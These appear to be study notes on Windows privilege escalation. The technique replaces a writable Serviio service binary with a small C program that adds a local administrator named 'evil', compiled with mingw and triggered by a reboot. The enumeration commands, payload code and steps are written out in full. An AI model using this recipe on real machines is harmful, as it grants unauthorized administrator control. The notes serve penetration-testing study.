A common privEsc is to exploit insecure file permissions on services that as **nt authority\system** 

Similar to tasklist, we have used PowerShell to display running services:
`Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`

Looking at the output, we see that the Serviio service is installed in the Program Files directory This means:
- Service is  user installed 
- Software Dev is in charge of the directory structure and permissions for software.

These circumstances are more prone to this type of vuln.

Enumerate permissions of target service with **icacls**. Outputs SIDs followed by permission mask:
`icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`

Mask |  Permissions
F | Full access
M | Modify access
RX | Read and execute access
R |  Read-only access
W | Write-only access

We can see that any user (BUILTIN\Users) on the system has full read and write access (F).

To exploit this, we need to replace **ServioService.exe** with our own malicious binary and trigger it by restarting the service or rebooting the machine.

Small C program to create and add a user "evil" to the Local Admin Group using the System function:
```
#include <stdlib.h>
int main ()
{
	int i;
	
	i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");
	
	return 0;
}
```


Cross-compile on kali:
`i686-w64-mingw32-gcc adduser.c -o adduser.exe`
**-o** specify output filename

Make a copy of the original ServiioSevice.exe (Chang the name)
Transfer, rename and move our malicious file over, replacing the original.

Restart the service:
`net stop Serviio`
System error 5 has occurred.
Access is denied.

What? Oops. Looks like we don't have enough privs to stop the service. This is expected as most services are managed by admin users.

If the service is set to "Automatic" we might be able to restart by rebooting the machine.

Check the start options of the service with wmic:
`wmic service where caption="Serviio" get name, caption, state, startmode`

Looks like it will auto start.

Does our current user have rights to restart the system?
`whoami /priv`

Yes.

***
The listing above shows that our user has been granted shutdown privileges
(SeShutdownPrivilege)532 (among others) and therefore we should be able to initiate a system shutdown or reboot. 

Note that the Disabled state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested, and hence is not currently using, the SeShutdownPrivilege privilege. 

If the SeShutdownPrivilege was not present, we would have to wait for the victim to manually start the service, which would be much less convenient for us.
***

Reboot in zero seconds:
`shutdown /r /t 0`

After reboot, we can login as "evil:Ev!lpass". Then confirm we are part of the admin group:
`net localgroup Administrators`

